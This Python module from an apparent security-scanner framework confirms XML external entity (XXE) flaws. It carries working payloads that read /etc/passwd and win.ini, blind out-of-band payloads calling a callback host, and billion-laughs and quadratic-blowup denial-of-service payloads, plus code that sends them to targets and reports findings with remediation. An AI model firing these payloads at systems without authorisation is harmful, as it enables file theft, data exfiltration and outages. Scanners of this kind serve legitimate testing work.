"""
RedTeef — XXE confirmation.

Entity expansion, blind XXE via out-of-band, parameter entity
injection, and DTD-based data exfiltration.

CWE-611: Improper Restriction of XML External Entity Reference
"""

from __future__ import annotations

import logging
import re
import secrets
from typing import List, Optional

import httpx

from krumpa.core import Finding, Severity, Target
from krumpa.core.http_client import HttpClient, HttpClientMixin

logger = logging.getLogger("krumpa.redteef.xxe_confirmer")

# Known file canaries for XXE data exfiltration
_ETC_PASSWD = re.compile(r"root:[x*]:0:0:", re.IGNORECASE)
_WIN_INI = re.compile(r"\[(fonts|extensions|mci extensions|files)\]", re.IGNORECASE)

# --- Classic XXE Payloads ---
_CLASSIC_XXE_PAYLOADS = [
    {
        "label": "Basic /etc/passwd",
        "payload": (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo ['
            '  <!ENTITY xxe SYSTEM "file:///etc/passwd">'
            ']>'
            '<root><data>&xxe;</data></root>'
        ),
        "canary": _ETC_PASSWD,
        "os_hint": "linux",
    },
    {
        "label": "Basic win.ini",
        "payload": (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo ['
            '  <!ENTITY xxe SYSTEM "file:///C:/windows/win.ini">'
            ']>'
            '<root><data>&xxe;</data></root>'
        ),
        "canary": _WIN_INI,
        "os_hint": "windows",
    },
    {
        "label": "PHP filter base64",
        "payload": (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo ['
            '  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">'
            ']>'
            '<root><data>&xxe;</data></root>'
        ),
        "canary": re.compile(r"[A-Za-z0-9+/=]{40,}", re.IGNORECASE),
        "os_hint": "linux",
    },
    {
        "label": "UTF-16 encoding",
        "payload": (
            '<?xml version="1.0" encoding="UTF-16"?>'
            '<!DOCTYPE foo ['
            '  <!ENTITY xxe SYSTEM "file:///etc/passwd">'
            ']>'
            '<root><data>&xxe;</data></root>'
        ),
        "canary": _ETC_PASSWD,
        "os_hint": "linux",
    },
]

# --- Blind XXE (OOB) Payloads ---
_BLIND_XXE_PAYLOADS = [
    {
        "label": "Blind XXE via HTTP",
        "template": (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo ['
            '  <!ENTITY % xxe SYSTEM "{callback}">'
            '  %xxe;'
            ']>'
            '<root>test</root>'
        ),
    },
    {
        "label": "Blind XXE parameter entity",
        "template": (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo ['
            '  <!ENTITY % payload SYSTEM "file:///etc/passwd">'
            '  <!ENTITY % dtd SYSTEM "{callback}">'
            '  %dtd;'
            ']>'
            '<root>test</root>'
        ),
    },
    {
        "label": "Blind XXE with external DTD",
        "template": (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo SYSTEM "{callback}">'
            '<root>test</root>'
        ),
    },
]

# --- Entity Expansion (Billion Laughs / Quadratic) ---
_EXPANSION_PAYLOADS = [
    {
        "label": "Billion laughs (light)",
        "payload": (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE lolz ['
            '  <!ENTITY lol "lol">'
            '  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">'
            '  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">'
            '  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">'
            ']>'
            '<root>&lol4;</root>'
        ),
    },
    {
        "label": "Quadratic blowup",
        "payload": (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo ['
            '  <!ENTITY a "' + "A" * 50000 + '">'
            ']>'
            '<root>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</root>'
        ),
    },
]


class XxeConfirmer(HttpClientMixin):
    """
    Confirm XXE by:
      1. Classic entity injection (file:///etc/passwd, win.ini)
      2. Blind XXE via out-of-band (OOB) callback
      3. Entity expansion (billion laughs, quadratic blowup)
      4. Parameter entity injection
    """

    def __init__(
        self,
        *,
        http_client: Optional[HttpClient] = None,
        callback_base_url: str = "https://xxe.krumpa.example.com",
    ) -> None:
        self._client = http_client
        self._owns_client = http_client is None
        self._callback_base = callback_base_url

    async def confirm(
        self,
        target: Target,
        inject_field: str = "",
    ) -> List[Finding]:
        """
        Attempt to confirm XXE on the target.

        Args:
            target: The target endpoint.
            inject_field: The parameter/field to inject XML into.
                         If empty, sends XML as raw body.

        Returns:
            List of confirmed findings.
        """
        findings: List[Finding] = []
        client = self._client or HttpClient(timeout=10.0, retries=0)

        try:
            # --- 1. Classic XXE ---
            classic = await self._test_classic_xxe(client, target, inject_field)
            findings.extend(classic)

            # --- 2. Blind XXE (OOB) ---
            blind = await self._test_blind_xxe(client, target, inject_field)
            findings.extend(blind)

            # --- 3. Entity expansion ---
            expansion = await self._test_entity_expansion(client, target, inject_field)
            findings.extend(expansion)

        finally:
            if self._owns_client and client is not self._client:
                await client.close()

        return findings

    # ------------------------------------------------------------------
    # Tests
    # ------------------------------------------------------------------

    async def _test_classic_xxe(
        self,
        client: HttpClient,
        target: Target,
        inject_field: str,
    ) -> List[Finding]:
        """Try classic entity injection with known file canaries."""
        findings: List[Finding] = []

        for spec in _CLASSIC_XXE_PAYLOADS:
            try:
                resp = await self._send_xml(
                    client, target, inject_field, spec["payload"],
                )
                if resp and resp.status_code in (200, 201):
                    if spec["canary"].search(resp.text):
                        findings.append(Finding(
                            title=f"[CONFIRMED] XXE — {spec['label']} on {target.url}",
                            description=(
                                f"XXE confirmed: {spec['label']} payload successfully "
                                f"extracted file contents from the {spec['os_hint']} "
                                f"system. The XML parser processes external entities."
                            ),
                            severity=Severity.CRITICAL,
                            target=target,
                            evidence=(
                                f"Payload: {spec['label']}\n"
                                f"OS: {spec['os_hint']}\n"
                                f"Status: {resp.status_code}\n"
                                f"Response snippet: {resp.text[:300]}"
                            ),
                            remediation=(
                                "Disable external entity processing in XML parsers. "
                                "Use defusedxml (Python), disable DTD processing, "
                                "or switch to JSON. Set feature flags: "
                                "FEATURE_SECURE_PROCESSING=true."
                            ),
                            cwe=611,
                            tags=["confirmed", "xxe", "file-read", "redteef"],
                        ))
                        return findings
            except (httpx.HTTPError, OSError, ValueError):
                continue

        return findings

    async def _test_blind_xxe(
        self,
        client: HttpClient,
        target: Target,
        inject_field: str,
    ) -> List[Finding]:
        """Blind XXE via out-of-band callback."""
        findings: List[Finding] = []

        for spec in _BLIND_XXE_PAYLOADS:
            canary_id = secrets.token_hex(8)
            callback_url = f"{self._callback_base}/xxe/{canary_id}"
            payload = spec["template"].format(callback=callback_url)

            try:
                resp = await self._send_xml(client, target, inject_field, payload)
                if resp and resp.status_code in (200, 201, 202):
                    # Can't confirm callback without OOB infra,
                    # but report the injection was accepted
                    findings.append(Finding(
                        title=f"Blind XXE payload accepted ({spec['label']}) on {target.url}",
                        description=(
                            f"Blind XXE payload ({spec['label']}) was accepted by the "
                            f"XML parser. If OOB monitoring detects a callback to "
                            f"'{callback_url}', XXE is confirmed."
                        ),
                        severity=Severity.MEDIUM,
                        target=target,
                        evidence=(
                            f"Payload: {spec['label']}\n"
                            f"Callback: {callback_url}\n"
                            f"Canary ID: {canary_id}\n"
                            f"Status: {resp.status_code}"
                        ),
                        remediation=(
                            "Disable external entity processing and DTD loading. "
                            "Block outbound connections from the XML parser."
                        ),
                        cwe=611,
                        tags=["xxe", "blind-xxe", "oob", "redteef"],
                    ))
                    return findings  # one blind XXE finding is enough
            except (httpx.HTTPError, OSError, ValueError):
                continue

        return findings

    async def _test_entity_expansion(
        self,
        client: HttpClient,
        target: Target,
        inject_field: str,
    ) -> List[Finding]:
        """Test entity expansion attacks (billion laughs, quadratic)."""
        findings: List[Finding] = []

        for spec in _EXPANSION_PAYLOADS:
            try:
                import time
                start = time.monotonic()
                resp = await self._send_xml(
                    client, target, inject_field, spec["payload"],
                )
                elapsed = time.monotonic() - start

                if resp:
                    # Slow response or 500 indicates expansion worked
                    if resp.status_code >= 500 or elapsed > 5.0:
                        findings.append(Finding(
                            title=f"XXE entity expansion DoS ({spec['label']}) on {target.url}",
                            description=(
                                f"Entity expansion payload ({spec['label']}) caused "
                                f"{'server error' if resp.status_code >= 500 else 'slow response'} "
                                f"({elapsed:.1f}s). The XML parser is vulnerable to "
                                f"entity expansion attacks (billion laughs / quadratic blowup)."
                            ),
                            severity=Severity.HIGH,
                            target=target,
                            evidence=(
                                f"Payload: {spec['label']}\n"
                                f"Status: {resp.status_code}\n"
                                f"Response time: {elapsed:.1f}s"
                            ),
                            remediation=(
                                "Disable DTD processing. Limit entity expansion depth/count. "
                                "Use defusedxml or equivalent safe parser. Set entity "
                                "expansion limits in the XML parser configuration."
                            ),
                            cwe=776,
                            tags=["xxe", "entity-expansion", "dos", "redteef"],
                        ))
                        return findings
            except (httpx.HTTPError, OSError, ValueError):
                continue

        return findings

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    async def _send_xml(
        self,
        client: HttpClient,
        target: Target,
        inject_field: str,
        xml_payload: str,
    ) -> Optional[httpx.Response]:
        """Send XML payload either as raw body or in a field."""
        try:
            if inject_field:
                body = {inject_field: xml_payload}
                return await client.request(
                    target.method or "POST", target.url, json_body=body,
                )
            else:
                return await client.request(
                    target.method or "POST", target.url,
                    headers={"Content-Type": "application/xml"},
                    body=xml_payload.encode("utf-8"),
                )
        except (httpx.HTTPError, OSError, ValueError):
            return None
